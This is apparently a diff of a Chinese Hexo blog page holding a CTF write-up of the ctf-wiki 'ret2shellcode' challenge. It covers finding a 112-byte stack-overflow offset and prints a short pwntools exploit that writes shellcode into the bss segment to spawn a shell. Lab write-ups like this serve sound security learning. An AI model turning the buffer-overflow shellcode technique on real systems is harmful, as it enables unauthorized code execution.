@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
+<head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
@@ -149,7 +151,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T3-ret2shellcode-1-bss%E6%AE%B5%E5%86%99%E5%85%A5"><span class="nav-text">T3 ret2shellcode 1  (bss段写入)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04"><span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05"><span class="nav-text">0x05</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text">T3 ret2shellcode 1  (bss段写入)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x05</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -175,7 +177,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -367,19 +369,19 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="T3-ret2shellcode-1-bss段写入"><a href="#T3-ret2shellcode-1-bss段写入" class="headerlink" title="T3 ret2shellcode 1  (bss段写入)"></a>T3 ret2shellcode 1  (bss段写入)</h2><blockquote>
+        <h2><span id="t3-ret2shellcode-1-bss段写入">T3 ret2shellcode 1  (bss段写入)</span></h2><blockquote>
 <p>2023-01-15WP<br>ctf-wiki pwn<br>考点：栈溢出 shellcode</p>
 </blockquote>
 <span id="more"></span>
 
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file，checksec —— 32bit，啥保护都没开<br><img data-src="https://pic1.zhimg.com/80/v2-c30ffe5ee07a9e5b5d0f124f011cc634_1440w.webp"></p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看源码，没有system函数和&#x2F;bin&#x2F;sh字符串<br>并且可以看到，main函数中，gets函数读取用户输入到变量s，strcnp将s中的字符串复制到buf2处<br><img data-src="https://pic3.zhimg.com/80/v2-da432353b394322fd2a9113c6042b0c6_1440w.webp"><br>buf2并没有在main函数中看到定义，应该是全局变量，进一步查看buf2在bss段中<br><img data-src="https://pic1.zhimg.com/80/v2-96ffdd44e368d33ff3f3def08797ce38_1440w.webp"></p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>通过vmmap我们可以查看bss段是否具有可执行权限<br><img data-src="https://pic1.zhimg.com/80/v2-3cac07ac2fda33db599f641decbd4a20_1440w.webp"><br>rw-p，可读可写<br>（这里操作上要注意一下，vmmap的命令要在程序运行时使用，可以给程序下断点或者ctrl+C停住程序再输命令）</p>
+<h3><span id="0x01">0x01</span></h3><p>file，checksec —— 32bit，啥保护都没开<br><img data-src="https://pic1.zhimg.com/80/v2-c30ffe5ee07a9e5b5d0f124f011cc634_1440w.webp"></p>
+<h3><span id="0x02">0x02</span></h3><p>IDA查看源码，没有system函数和&#x2F;bin&#x2F;sh字符串<br>并且可以看到，main函数中，gets函数读取用户输入到变量s，strcnp将s中的字符串复制到buf2处<br><img data-src="https://pic3.zhimg.com/80/v2-da432353b394322fd2a9113c6042b0c6_1440w.webp"><br>buf2并没有在main函数中看到定义，应该是全局变量，进一步查看buf2在bss段中<br><img data-src="https://pic1.zhimg.com/80/v2-96ffdd44e368d33ff3f3def08797ce38_1440w.webp"></p>
+<h3><span id="0x03">0x03</span></h3><p>通过vmmap我们可以查看bss段是否具有可执行权限<br><img data-src="https://pic1.zhimg.com/80/v2-3cac07ac2fda33db599f641decbd4a20_1440w.webp"><br>rw-p，可读可写<br>（这里操作上要注意一下，vmmap的命令要在程序运行时使用，可以给程序下断点或者ctrl+C停住程序再输命令）</p>
 <p><a target="_blank" rel="noopener" href="https://ch4r1l3.github.io/2018/06/22/pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%AC%AC%E4%B8%89%E7%AB%A0%E2%80%94%E2%80%94gdb%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">参考资料</a></p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>有执行权限的话就可以向bss段写入shellcode了，之后控制程序返回执行shellcode<br>在写exp之前还要先计算偏移量，方法和ret2text类似，与之前的偏移量都是一样的<br>用gdb调试或者爆破求出偏移量为112<br>使用shellcraft.sh()生成shellcode，并且用shellcode.ljust()方法向左对齐补齐字符串，溢出填充返回地址<br>exp为</p>
+<h3><span id="0x04">0x04</span></h3><p>有执行权限的话就可以向bss段写入shellcode了，之后控制程序返回执行shellcode<br>在写exp之前还要先计算偏移量，方法和ret2text类似，与之前的偏移量都是一样的<br>用gdb调试或者爆破求出偏移量为112<br>使用shellcraft.sh()生成shellcode，并且用shellcode.ljust()方法向左对齐补齐字符串，溢出填充返回地址<br>exp为</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">p.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>好像shellcode写在栈或者bss段上都可以吧？</p>
+<h3><span id="0x05">0x05</span></h3><p>好像shellcode写在栈或者bss段上都可以吧？</p>
 <p>网上看到一个解释说不能直接把shellcode写在栈上？不知道对不对：<br>绝大多数的操作系统都默认开启ASLR保护，这大大提高了攻击栈的难度。因此，栈应当是我们最后考虑的对象</p>
 
     </div>
@@ -588,13 +590,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">211k</span>
+    <span title="站点总字数">212k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:12</span>
+    <span title="站点阅读时长">3:13</span>
   </span>
 </div>
 <div class="busuanzi-count">
